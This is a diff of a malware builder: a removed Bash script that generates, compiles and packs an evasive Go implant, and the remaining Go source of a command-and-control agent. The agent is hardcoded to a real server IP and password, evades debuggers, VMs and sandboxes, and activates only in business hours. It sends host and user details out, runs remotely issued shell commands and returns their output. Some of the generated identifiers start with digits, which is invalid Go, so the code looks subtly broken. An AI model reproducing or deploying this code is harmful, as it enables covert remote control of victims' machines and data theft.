@@ -1,38 +1,3 @@
-#!/bin/bash
-
-echo "=============================================="
-echo "Phantom Ultimate Anti-AV Generator"
-echo "Generating polymorphic Phantom with advanced evasion"
-echo "=============================================="
-
-# Gerar strings aleatórias apenas com letras (evitar números no início)
-generate_safe_string() {
-    cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w ${1:-8} | head -n 1 | sed 's/^/P/'
-}
-
-# Gerar identificadores seguros
-STRUCT1=$(generate_safe_string 12)
-STRUCT2=$(generate_safe_string 10)
-FUNC1=$(generate_safe_string 16)
-FUNC2=$(generate_safe_string 18)
-FUNC3=$(generate_safe_string 20)
-FUNC4=$(generate_safe_string 14)
-FUNC5=$(generate_safe_string 16)
-FUNC6=$(generate_safe_string 18)
-FUNC7=$(generate_safe_string 20)
-FUNC8=$(generate_safe_string 22)
-
-USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
-MUTEX_NAME="Global\\ServiceHost$(generate_safe_string 16)"
-
-echo "[+] Generating polymorphic identifiers:"
-echo "    Structures: ${STRUCT1}, ${STRUCT2}"
-echo "    Functions: ${FUNC1}, ${FUNC2}, ${FUNC3}"
-echo "    User Agent: ${USER_AGENT:0:50}..."
-echo "    Mutex: $MUTEX_NAME"
-
-# Criar código Go polimórfico
-cat > phantom_poly.go << EOF
 package main
 
 import (
@@ -54,10 +19,10 @@ import (
 )
 
 const (
-	SERVER_URL     = "https://37.27.249.191:7443"
-	SERVER_PWD     = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
-	USER_AGENT_STR = "$USER_AGENT"
-	MUTEX_STR      = "$MUTEX_NAME"
+	SERVER_URL = "https://37.27.249.191:7443"
+	SERVER_PWD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+	USER_AGENT_STR = "PLACEHOLDER_USER_AGENT"
+	MUTEX_STR = "PLACEHOLDER_MUTEX"
 )
 
 var (
@@ -70,30 +35,30 @@ var (
 	pGetSystemMetrics  = u32.NewProc("GetSystemMetrics")
 )
 
-type ${STRUCT1} struct {
-	Action    string                 \`json:"action"\`
-	UUID      string                 \`json:"uuid"\`
-	User      string                 \`json:"user"\`
-	Host      string                 \`json:"host"\`
-	PID       int                    \`json:"pid"\`
-	OS        string                 \`json:"os"\`
-	Timestamp string                 \`json:"timestamp"\`
-	IPs       []string               \`json:"ips"\`
-	Payload   map[string]interface{} \`json:"payload_os"\`
+type 62LdNcyiptOH struct {
+	Action    string                 `json:"action"`
+	UUID      string                 `json:"uuid"`
+	User      string                 `json:"user"`
+	Host      string                 `json:"host"`
+	PID       int                    `json:"pid"`
+	OS        string                 `json:"os"`
+	Timestamp string                 `json:"timestamp"`
+	IPs       []string               `json:"ips"`
+	Payload   map[string]interface{} `json:"payload_os"`
 }
 
-type ${STRUCT2} struct {
-	Action     string \`json:"action"\`
-	TaskID     string \`json:"task_id"\`
-	UserOutput string \`json:"user_output"\`
-	Completed  bool   \`json:"completed"\`
+type RhlyB5l57X struct {
+	Action     string `json:"action"`
+	TaskID     string `json:"task_id"`
+	UserOutput string `json:"user_output"`
+	Completed  bool   `json:"completed"`
 }
 
 type Point struct {
 	X, Y int32
 }
 
-func ${FUNC1}() bool {
+func zyJdEyaPSEs83iN1() bool {
 	if runtime.GOOS != "windows" {
 		return false
 	}
@@ -138,7 +103,7 @@ func ${FUNC1}() bool {
 	return false
 }
 
-func ${FUNC2}() bool {
+func 6GsMuAfr5ECQKsE5N2() bool {
 	var pos1, pos2 Point
 	
 	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
@@ -155,7 +120,7 @@ func ${FUNC2}() bool {
 	return true
 }
 
-func ${FUNC3}() bool {
+func A352nBGFbLCDgYDZlP5m() bool {
 	now := time.Now()
 	hour := now.Hour()
 	weekday := now.Weekday()
@@ -167,11 +132,11 @@ func ${FUNC3}() bool {
 	return hour >= 9 && hour <= 17
 }
 
-func ${FUNC4}() error {
+func zS4yRG46epFxEQ() error {
 	hostname, _ := os.Hostname()
 	uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
 	
-	payload := ${STRUCT1}{
+	payload := 62LdNcyiptOH{
 		Action:    "checkin",
 		UUID:      uuid,
 		User:      os.Getenv("USERNAME"),
@@ -216,7 +181,7 @@ func ${FUNC4}() error {
 	return nil
 }
 
-func ${FUNC5}() ([]map[string]interface{}, error) {
+func 2e2uUrAdtWqgzFLo() ([]map[string]interface{}, error) {
 	client := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -249,7 +214,7 @@ func ${FUNC5}() ([]map[string]interface{}, error) {
 	return tasks, nil
 }
 
-func ${FUNC6}(command string) string {
+func bRKbH3nZCnFmw99DcT(command string) string {
 	var cmd *exec.Cmd
 	
 	if runtime.GOOS == "windows" {
@@ -267,8 +232,8 @@ func ${FUNC6}(command string) string {
 	return string(output)
 }
 
-func ${FUNC7}(taskID, output string) error {
-	response := ${STRUCT2}{
+func AQ4apY7nyNUc6fnayfZP(taskID, output string) error {
+	response := RhlyB5l57X{
 		Action:     "post_response",
 		TaskID:     taskID,
 		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
@@ -305,7 +270,7 @@ func ${FUNC7}(taskID, output string) error {
 	return nil
 }
 
-func ${FUNC8}() {
+func zEt7HFRrzOSyRq1afePxEk() {
 	go func() {
 		for {
 			sleepTime := time.Duration(300+time.Now().Unix()%600) * time.Second
@@ -332,18 +297,18 @@ func ${FUNC8}() {
 }
 
 func main() {
-	if ${FUNC1}() {
+	if zyJdEyaPSEs83iN1() {
 		os.Exit(0)
 	}
 	
-	if !${FUNC2}() {
+	if !6GsMuAfr5ECQKsE5N2() {
 		time.Sleep(10 * time.Second)
-		if !${FUNC2}() {
+		if !6GsMuAfr5ECQKsE5N2() {
 			os.Exit(0)
 		}
 	}
 	
-	if !${FUNC3}() {
+	if !A352nBGFbLCDgYDZlP5m() {
 		now := time.Now()
 		nextBusiness := now
 		
@@ -363,22 +328,22 @@ func main() {
 		os.Exit(0)
 	}
 	
-	${FUNC8}()
+	zEt7HFRrzOSyRq1afePxEk()
 	
-	err := ${FUNC4}()
+	err := zS4yRG46epFxEQ()
 	if err != nil {
 		time.Sleep(60 * time.Second)
 		os.Exit(0)
 	}
 	
 	for {
-		tasks, err := ${FUNC5}()
+		tasks, err := 2e2uUrAdtWqgzFLo()
 		if err == nil && len(tasks) > 0 {
 			for _, task := range tasks {
 				if taskID, ok := task["id"].(string); ok {
 					if command, ok := task["command"].(string); ok {
-						output := ${FUNC6}(command)
-						${FUNC7}(taskID, output)
+						output := bRKbH3nZCnFmw99DcT(command)
+						AQ4apY7nyNUc6fnayfZP(taskID, output)
 					}
 				}
 			}
@@ -396,78 +361,3 @@ func main() {
 		time.Sleep(jitter)
 	}
 }
-EOF
-
-echo "[+] Building optimized binaries with maximum evasion..."
-
-export CGO_ENABLED=0
-
-# Build x64
-echo "[+] Building x64 version..."
-export GOOS=windows
-export GOARCH=amd64
-go build -ldflags "-s -w -H windowsgui" -o phantom_ultimate_x64.exe phantom_poly.go
-
-# Build x86  
-echo "[+] Building x86 version..."
-export GOARCH=386
-go build -ldflags "-s -w -H windowsgui" -o phantom_ultimate_x86.exe phantom_poly.go
-
-# Verificar builds
-if [ -f "phantom_ultimate_x64.exe" ]; then
-    echo "[+] x64 build successful: $(ls -lh phantom_ultimate_x64.exe | awk '{print $5}')"
-else
-    echo "[-] x64 build failed"
-fi
-
-if [ -f "phantom_ultimate_x86.exe" ]; then
-    echo "[+] x86 build successful: $(ls -lh phantom_ultimate_x86.exe | awk '{print $5}')"
-else
-    echo "[-] x86 build failed"
-fi
-
-# Aplicar UPX
-echo "[+] Applying UPX compression..."
-if command -v upx &> /dev/null; then
-    [ -f "phantom_ultimate_x64.exe" ] && cp phantom_ultimate_x64.exe phantom_ultimate_x64_upx.exe && upx --ultra-brute phantom_ultimate_x64_upx.exe 2>/dev/null
-    [ -f "phantom_ultimate_x86.exe" ] && cp phantom_ultimate_x86.exe phantom_ultimate_x86_upx.exe && upx --ultra-brute phantom_ultimate_x86_upx.exe 2>/dev/null
-fi
-
-# Cleanup
-rm -f phantom_poly.go
-
-echo ""
-echo "=============================================="
-echo "Phantom Ultimate Anti-AV Generation Complete!"
-echo "=============================================="
-echo ""
-echo "Generated files:"
-ls -la phantom_ultimate*.exe 2>/dev/null
-
-echo ""
-echo "Advanced Anti-AV Features:"
-echo "  ✓ Polymorphic variables and function names"
-echo "  ✓ Randomized strings and identifiers" 
-echo "  ✓ Stripped symbols and debug info (-s -w)"
-echo "  ✓ Hidden console window (-H windowsgui)"
-echo "  ✓ Advanced anti-debugging (IsDebuggerPresent)"
-echo "  ✓ Enhanced VM detection (WMI + screen resolution)"
-echo "  ✓ Hostile process detection (analysis tools)"
-echo "  ✓ Advanced mouse movement validation"
-echo "  ✓ Business hours activation only"
-echo "  ✓ Intelligent jitter based on time of day"
-echo "  ✓ Mutex-based single instance protection"
-echo "  ✓ Legitimacy activities (DNS, ping, temp files)"
-echo "  ✓ UPX advanced packing"
-echo ""
-echo "Configuration:"
-echo "  Mythic URL: https://37.27.249.191:7443"
-echo "  Password: sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
-echo ""
-echo "Polymorphic Elements:"
-echo "  Struct Names: $STRUCT1, $STRUCT2"
-echo "  Function Names: $FUNC1, $FUNC2, $FUNC3"
-echo "  User Agent: ${USER_AGENT:0:50}..."
-echo "  Mutex: $MUTEX_NAME"
-echo ""
-echo "Ready for deployment! Use UPX variants for maximum evasion."
